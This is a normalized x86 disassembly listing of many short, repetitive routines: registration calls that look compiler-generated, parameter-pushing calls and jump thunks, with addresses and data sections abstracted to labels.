push sub_440ed2
call sub_424852
pop ecx
retn
sub_44082d
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440ee1
call sub_424852
pop ecx
retn
sub_440848
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440ef0
call sub_424852
pop ecx
retn
sub_440863
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440eff
call sub_424852
pop ecx
retn
sub_44087e
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440f0e
call sub_424852
pop ecx
retn
sub_440899
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440f1d
call sub_424852
pop ecx
retn
sub_4408b4
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440f2c
call sub_424852
pop ecx
retn
sub_4408cf
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440f3b
call sub_424852
pop ecx
retn
sub_4408ea
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440f4a
call sub_424852
pop ecx
retn
sub_440905
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440f59
call sub_424852
pop ecx
retn
sub_440920
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440f68
call sub_424852
pop ecx
retn
sub_44093b
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440f77
call sub_424852
pop ecx
retn
sub_440956
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440f86
call sub_424852
pop ecx
retn
sub_440971
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440f95
call sub_424852
pop ecx
retn
sub_44098c
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440fa4
call sub_424852
pop ecx
retn
sub_4409a7
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440fb3
call sub_424852
pop ecx
retn
sub_4409c2
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440fc2
call sub_424852
pop ecx
retn
sub_4409dd
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440fd1
call sub_424852
pop ecx
retn
sub_4409f8
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440fe0
call sub_424852
pop ecx
retn
sub_440a13
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440fef
call sub_424852
pop ecx
retn
sub_440a2e
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440ffe
call sub_424852
pop ecx
retn
sub_440a49
push r--data
mov ecx rw-data
call sub_403dc1
push sub_44100d
call sub_424852
pop ecx
retn
sub_440a64
push r--data
mov ecx rw-data
call sub_403dc1
push sub_44101c
call sub_424852
pop ecx
retn
sub_440a7f
push r--data
mov ecx rw-data
call sub_403dc1
push sub_44102b
call sub_424852
pop ecx
retn
sub_440a9a
push r--data
mov ecx rw-data
call sub_403dc1
push sub_44103a
call sub_424852
pop ecx
retn
sub_440ab5
push r--data
mov ecx rw-data
call sub_403dc1
push sub_441049
call sub_424852
pop ecx
retn
sub_440ad0
push r--data
mov ecx rw-data
call sub_403dc1
push sub_441058
call sub_424852
pop ecx
retn
sub_440aeb
push r--data
mov ecx rw-data
call sub_403dc1
push sub_441067
call sub_424852
pop ecx
retn
sub_440cae
push sub_44108a
call sub_424852
pop ecx
retn
sub_440cba
mov ecx rw-data
call sub_422fe4
push sub_441094
call sub_424852
pop ecx
retn
sub_440cd0
mov ecx rw-data
call sub_422fe4
push sub_44109e
call sub_424852
pop ecx
retn
sub_440ce6
push sub_4410a8
call sub_424852
pop ecx
retn
sub_440cf2
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440d01
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440d10
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440d1f
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440d2e
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440d3d
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440d4c
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440d5b
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440d6a
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440d79
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440d88
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440d97
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440da6
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440db5
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440dc4
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440dd3
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440de2
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440df1
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440e00
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440e0f
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440e1e
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440e2d
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440e3c
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440e4b
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440e5a
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440e69
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440e78
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440e87
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440e96
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440ea5
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440eb4
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440ec3
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440ed2
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440ee1
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440ef0
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440eff
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440f0e
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440f1d
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440f2c
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440f3b
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440f4a
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440f59
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440f68
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440f77
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440f86
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440f95
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440fa4
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440fb3
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440fc2
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440fd1
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440fe0
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440fef
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_440ffe
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_44100d
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_44101c
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_44102b
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_44103a
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_441049
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_441058
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_441067
push 0x0
push 0x1
mov ecx rw-data
call sub_40415f
retn
sub_441076
push sub_410038
push 0x15
push 0x1c
push rw-data
call sub_424c22
retn
sub_44108a
mov ecx rw-data
jmp sub_4061b7
sub_441094
mov ecx rw-data
jmp sub_423015
sub_44109e
mov ecx rw-data
jmp sub_423015
sub_4410a8
mov ecx rw-data
jmp sub_4233ee
sub_4410b2
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_4238ce
